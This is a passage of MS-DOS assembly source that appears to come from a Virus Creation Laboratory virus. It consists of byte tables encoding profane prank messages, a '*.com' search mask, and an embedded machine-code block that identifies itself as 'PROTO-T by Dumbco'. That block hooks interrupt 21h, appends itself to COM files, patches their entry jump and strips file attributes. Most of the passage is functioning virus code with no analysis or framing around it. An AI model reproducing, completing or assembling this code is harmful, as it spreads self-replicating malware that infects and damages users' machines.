		db      049h, 027h, 06Dh, 020h, 061h, 066h, 072h, 061h
		db      069h, 064h, 020h, 049h, 020h, 063h, 061h, 06Eh
		db      027h, 074h, 020h, 064h, 06Fh, 020h, 074h, 068h
		db      061h, 074h, 021h, 00Dh, 00Ah, 024h, 005h, 046h
		db      06Fh, 072h, 06Dh, 061h, 074h, 020h, 061h, 06Eh
		db      06Fh, 074h, 068h, 065h, 072h, 03Fh, 020h, 028h
		db      059h, 02Fh, 04Eh, 029h, 03Fh, 020h, 024h, 007h
		db      044h, 061h, 06Dh, 06Eh, 020h, 069h, 074h, 021h
		db      020h, 020h, 049h, 020h, 074h, 06Fh, 06Ch, 064h
		db      020h, 079h, 06Fh, 075h, 020h, 06Eh, 06Fh, 074h
		db      020h, 074h, 06Fh, 020h, 074h, 06Fh, 075h, 063h
		db      068h, 020h, 074h, 068h, 061h, 074h, 021h, 024h
		db      000h, 053h, 075h, 063h, 06Bh, 020h, 06Dh, 065h
		db      021h, 00Dh, 00Ah, 024h, 002h, 043h, 06Fh, 063h
		db      06Bh, 073h, 075h, 063h, 06Bh, 065h, 072h, 020h
		db      041h, 074h, 020h, 04Bh, 065h, 079h, 062h, 06Fh
		db      061h, 072h, 064h, 020h, 065h, 072h, 072h, 06Fh
		db      072h, 020h, 072h, 065h, 061h, 064h, 069h, 06Eh
		db      067h, 020h, 064h, 065h, 076h, 069h, 063h, 065h
		db      020h, 043h, 04Fh, 04Eh, 03Ah, 024h, 000h, 007h
		db      00Dh, 00Dh, 00Dh, 007h, 00Dh, 00Dh, 00Dh, 007h
		db      00Dh, 00Dh, 00Dh, 00Ah, 049h, 027h, 06Dh, 020h
		db      073h, 06Fh, 072h, 072h, 079h, 02Ch, 020h, 062h
		db      075h, 074h, 020h, 079h, 06Fh, 075h, 072h, 020h
		db      063h, 061h, 06Ch, 06Ch, 020h, 063h, 061h, 06Eh
		db      06Eh, 06Fh, 074h, 020h, 062h, 065h, 020h, 063h
		db      06Fh, 06Dh, 070h, 06Ch, 065h, 074h, 065h, 064h
		db      020h, 061h, 073h, 020h, 064h, 069h, 061h, 06Ch
		db      065h, 064h, 02Eh, 00Dh, 00Ah, 050h, 06Ch, 065h
		db      061h, 073h, 065h, 020h, 068h, 061h, 06Eh, 067h
		db      020h, 075h, 070h, 020h, 026h, 020h, 074h, 072h
		db      079h, 020h, 079h, 06Fh, 075h, 072h, 020h, 063h
		db      061h, 06Ch, 06Ch, 020h, 061h, 067h, 061h, 069h
		db      06Eh, 02Eh, 00Dh, 00Ah, 024h, 000h, 04Eh, 06Fh
		db      021h, 00Dh, 00Ah, 00Dh, 00Ah, 024h, 001h, 050h
		db      061h, 06Eh, 069h, 063h, 020h, 06Bh, 065h, 072h
		db      06Eh, 061h, 06Ch, 020h, 06Dh, 06Fh, 064h, 065h
		db      020h, 069h, 06Eh, 074h, 065h, 072h, 072h, 075h
		db      070h, 074h, 024h, 005h, 043h, 04Fh, 04Eh, 04Eh
		db      045h, 043h, 054h, 020h, 031h, 032h, 030h, 030h
		db      0ABh, 00Dh, 00Ah, 00Dh, 00Ah, 024h, 003h, 04Fh
		db      06Bh, 061h, 079h, 02Ch, 020h, 06Fh, 06Bh, 061h
		db      079h, 021h, 020h, 020h, 042h, 065h, 020h, 070h
		db      061h, 074h, 069h, 065h, 06Eh, 074h, 021h, 020h
		db      02Eh, 02Eh, 02Eh, 00Dh, 00Ah, 024h, 000h, 041h
		db      06Eh, 064h, 020h, 069h, 066h, 020h, 049h, 020h
		db      072h, 065h, 066h, 075h, 073h, 065h, 03Fh, 00Dh
		db      00Ah, 024h, 003h, 046h, 075h, 063h, 06Bh, 020h
		db      074h, 068h, 065h, 020h, 077h, 06Fh, 072h, 06Ch
		db      064h, 020h, 061h, 06Eh, 064h, 020h, 069h, 074h
		db      073h, 020h, 066h, 06Fh, 06Ch, 06Ch, 06Fh, 077h
		db      065h, 072h, 073h, 021h, 00Dh, 00Ah, 024h, 003h
		db      059h, 06Fh, 075h, 020h, 061h, 072h, 065h, 020h
		db      070h, 061h, 074h, 068h, 065h, 074h, 069h, 063h
		db      02Ch, 020h, 06Dh, 061h, 06Eh, 02Eh, 02Eh, 02Eh
		db      020h, 079h, 06Fh, 075h, 020h, 06Bh, 06Eh, 06Fh
		db      077h, 020h, 074h, 068h, 061h, 074h, 03Fh, 00Dh
		db      00Ah, 024h, 000h, 043h, 075h, 06Dh, 020h, 06Fh
		db      06Eh, 021h, 020h, 020h, 054h, 061h, 06Ch, 06Bh
		db      020h, 044h, 049h, 052h, 054h, 059h, 020h, 074h
		db      06Fh, 020h, 06Dh, 065h, 020h, 021h, 021h, 021h
		db      00Dh, 00Ah, 024h, 000h, 059h, 06Fh, 075h, 072h
		db      020h, 063h, 06Fh, 070h, 072h, 06Fh, 063h, 065h
		db      073h, 073h, 06Fh, 072h, 020h, 077h, 065h, 061h
		db      072h, 073h, 020h, 066h, 06Ch, 06Fh, 070h, 070h
		db      079h, 020h, 064h, 069h, 073h, 06Bh, 073h, 021h
		db      00Dh, 00Ah, 024h, 006h, 04Ah, 06Fh, 06Bh, 065h
		db      072h, 021h, 020h, 076h, 065h, 072h, 020h, 0E0h
		db      0E0h, 020h, 062h, 079h, 020h, 054h, 042h, 053h
		db      049h, 021h, 00Dh, 00Ah, 052h, 065h, 06Dh, 065h
		db      06Dh, 062h, 065h, 072h, 021h, 020h, 020h, 045h
		db      056h, 045h, 052h, 059h, 054h, 048h, 049h, 04Eh
		db      047h, 027h, 073h, 020h, 062h, 069h, 067h, 067h
		db      065h, 072h, 020h, 069h, 06Eh, 020h, 054h, 065h
		db      078h, 061h, 073h, 021h, 00Dh, 00Ah, 024h, 032h
		db      0C0h, 0CFh, 02Ah, 02Eh, 043h, 04Fh, 04Dh, 000h
		db      02Eh, 02Eh, 000h, 003h, 000h, 001h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h

data04          db      "*.com",0
		

data05          dw      2BEh
		db      0E9h, 003h, 000h, 044h, 048h, 000h, 0E8h, 000h
		db      000h, 0B4h, 02Ch, 0CDh, 021h, 08Ah, 0C5h, 098h
		db      03Dh, 010h, 000h, 07Dh, 003h, 0E9h, 08Ah, 000h
		db      0FAh, 0BAh, 002h, 000h, 0BDh, 040h, 000h, 0BEh
		db      000h, 010h, 0BFh, 000h, 020h, 0B0h, 0B6h, 0E6h
		db      043h, 08Bh, 0DEh, 08Bh, 0C3h, 0E6h, 042h, 08Ah
		db      0C4h, 0E6h, 042h, 0E4h, 061h, 00Ch, 003h, 0E6h
		db      061h, 0B9h, 0E0h, 02Eh, 0E2h, 0FEh, 087h, 0FEh
		db      0E4h, 061h, 024h, 0FCh, 0E6h, 061h, 04Dh, 075h
		db      0E0h, 0B8h, 010h, 000h, 0B9h, 060h, 0EAh, 0E2h
		db      0FEh, 048h, 075h, 0F8h, 04Ah, 075h, 0C5h, 0FBh
		db      0BEh, 000h, 000h, 0ACh, 08Ah, 0E0h, 0ACh, 024h
		db      003h, 0B2h, 080h, 08Ah, 0F0h, 08Ah, 0ECh, 0B1h
		db      001h, 0BBh, 0BDh, 003h, 0B8h, 001h, 002h, 0CDh
		db      013h, 0EBh, 0E8h, 054h, 068h, 069h, 073h, 020h
		db      070h, 072h, 06Fh, 067h, 072h, 061h, 06Dh, 020h
		db      069h, 073h, 020h, 073h, 069h, 063h, 06Bh, 02Eh
		db      020h, 05Bh, 050h, 052h, 04Fh, 054h, 04Fh, 02Dh
		db      054h, 020h, 062h, 079h, 020h, 044h, 075h, 06Dh
		db      062h, 063h, 06Fh, 02Ch, 020h, 049h, 04Eh, 043h
		db      02Eh, 05Dh, 05Dh, 081h, 0EDh, 009h, 001h, 0BFh
		db      000h, 001h, 08Dh, 0B6h, 0A6h, 003h, 0B9h, 006h
		db      000h, 0F3h, 0A4h, 0B4h, 0A0h, 0CDh, 021h, 03Dh
		db      001h, 000h, 074h, 05Bh, 08Ch, 0C8h, 048h, 08Eh
		db      0D8h, 080h, 03Eh, 000h, 000h, 05Ah, 075h, 047h
		db      0A1h, 003h, 000h, 02Dh, 050h, 000h, 0A3h, 003h
		db      000h, 08Bh, 0D8h, 08Ch, 0C0h, 003h, 0C3h, 08Eh
		db      0C0h, 0B9h, 0B7h, 002h, 08Ch, 0D8h, 040h, 08Eh
		db      0D8h, 08Dh, 0B6h, 006h, 001h, 0BFh, 000h, 001h
		db      0F3h, 0A4h, 03Eh, 08Ch, 086h, 0B1h, 003h, 08Ch
		db      0C8h, 08Eh, 0C0h, 0FAh, 0B8h, 021h, 035h, 0CDh
		db      021h, 03Eh, 08Eh, 09Eh, 0B1h, 003h, 089h, 01Eh
		db      094h, 003h, 08Ch, 006h, 096h, 003h, 0BAh, 016h
		db      002h, 0B8h, 021h, 025h, 0CDh, 021h, 0FBh, 08Ch
		db      0C8h, 08Eh, 0D8h, 08Eh, 0C0h, 033h, 0C0h, 0BBh
		db      000h, 001h, 0FFh, 0E3h, 09Ch, 080h, 0FCh, 0A0h
		db      075h, 005h, 0B8h, 001h, 000h, 09Dh, 0CFh, 01Eh
		db      006h, 057h, 056h, 050h, 053h, 051h, 052h, 080h
		db      0FCh, 040h, 075h, 005h, 083h, 0FBh, 004h, 075h
		db      000h, 080h, 0FCh, 005h, 075h, 000h, 03Dh, 000h
		db      04Bh, 075h, 00Dh, 02Eh, 08Ch, 01Eh, 0A7h, 003h
		db      02Eh, 089h, 016h, 0A9h, 003h, 0EBh, 00Fh, 090h
		db      05Ah, 059h, 05Bh, 058h, 05Eh, 05Fh, 007h, 01Fh
		db      09Dh, 02Eh, 0FFh, 02Eh, 094h, 003h, 0FCh, 08Bh
		db      0FAh, 01Eh, 007h, 0B0h, 02Eh, 0F2h, 0AEh, 026h
		db      081h, 03Dh, 043h, 04Fh, 075h, 0E2h, 026h, 083h
		db      07Dh, 002h, 04Dh, 075h, 0DBh, 0E8h, 0ECh, 000h
		db      0E8h, 005h, 001h, 02Eh, 08Eh, 01Eh, 0A7h, 003h
		db      02Eh, 08Bh, 016h, 0A9h, 003h, 0B8h, 002h, 03Dh
		db      0E8h, 083h, 000h, 072h, 054h, 00Eh, 01Fh, 0A3h
		db      0AFh, 003h, 08Bh, 0D8h, 0E8h, 0BCh, 000h, 00Eh
		db      01Fh, 08Bh, 01Eh, 0AFh, 003h, 0B4h, 03Fh, 0B9h
		db      006h, 000h, 0BAh, 0A0h, 003h, 0E8h, 066h, 000h
		db      0A0h, 0A3h, 003h, 08Ah, 026h, 0A4h, 003h, 03Bh
		db      006h, 0B5h, 003h, 074h, 018h, 0B8h, 000h, 042h
		db      0E8h, 045h, 000h, 0B8h, 002h, 042h, 0E8h, 03Fh
		db      000h, 02Dh, 003h, 000h, 0A3h, 0ADh, 003h, 0E8h
		db      04Bh, 000h, 0E8h, 072h, 000h, 00Eh, 01Fh, 08Bh
		db      01Eh, 0AFh, 003h, 08Bh, 016h, 0B1h, 003h, 08Bh
		db      00Eh, 0B3h, 003h, 0B8h, 001h, 057h, 0E8h, 02Dh
		db      000h, 08Bh, 01Eh, 0AFh, 003h, 0B4h, 03Eh, 0E8h
		db      024h, 000h, 02Eh, 08Bh, 016h, 09Ch, 003h, 02Eh
		db      08Eh, 01Eh, 09Eh, 003h, 0B8h, 024h, 025h, 0E8h
		db      014h, 000h, 0E9h, 053h, 0FFh, 0B0h, 003h, 0CFh
		db      00Eh, 01Fh, 08Bh, 01Eh, 0AFh, 003h, 033h, 0C9h
		db      033h, 0D2h, 0E8h, 001h, 000h, 0C3h, 09Ch, 02Eh
		db      0FFh, 01Eh, 094h, 003h, 0C3h, 00Eh, 01Fh, 0B8h
		db      000h, 042h, 0E8h, 0E3h, 0FFh, 0B4h, 040h, 0B9h
		db      001h, 000h, 0BAh, 0A6h, 003h, 0E8h, 0E6h, 0FFh
		db      0B4h, 040h, 0B9h, 002h, 000h, 0BAh, 0ADh, 003h
		db      0E8h, 0DBh, 0FFh, 0B4h, 040h, 0B9h, 002h, 000h
		db      0BAh, 0B5h, 003h, 0E8h, 0D0h, 0FFh, 0C3h, 00Eh
		db      01Fh, 0B8h, 002h, 042h, 0E8h, 0B9h, 0FFh, 0B4h
		db      040h, 0B9h, 0B7h, 002h, 0BAh, 000h, 001h, 0E8h
		db      0BCh, 0FFh, 0C3h, 0B8h, 000h, 057h, 0E8h, 0B5h
		db      0FFh, 00Eh, 01Fh, 089h, 016h, 0B1h, 003h, 089h
		db      00Eh, 0B3h, 003h, 0C3h, 0B8h, 024h, 035h, 0E8h
		db      0A4h, 0FFh, 02Eh, 089h, 01Eh, 09Ch, 003h, 02Eh
		db      08Ch, 006h, 09Eh, 003h, 0BAh, 0F7h, 002h, 00Eh
		db      01Fh, 0B8h, 024h, 025h, 0E8h, 08Fh, 0FFh, 0C3h
		db      0B8h, 000h, 043h, 02Eh, 08Eh, 01Eh, 0A7h, 003h
		db      02Eh, 08Bh, 016h, 0A9h, 003h, 0E8h, 07Eh, 0FFh
		db      080h, 0E1h, 0FEh, 0B8h, 001h, 043h, 0E8h, 075h
		db      0FFh, 0C3h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 090h, 0CDh
		db      020h, 044h, 048h, 000h, 0E9h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 044h, 048h, 090h

vcl_marker:     db      "[vcl]",0

finish          label   near

code            ends
		end     main
